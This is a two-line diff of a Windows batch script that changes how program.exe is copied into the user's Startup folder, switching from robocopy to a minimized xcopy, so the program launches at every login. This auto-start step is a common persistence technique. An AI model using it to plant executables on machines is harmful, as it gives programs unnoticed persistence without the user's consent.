@@ -1,2 +1,2 @@
-robocopy "./" "C:\Users\muham\AppData\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" program.exe /MOVE
+start /min xcopy /y /z program.exe "%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
 exit
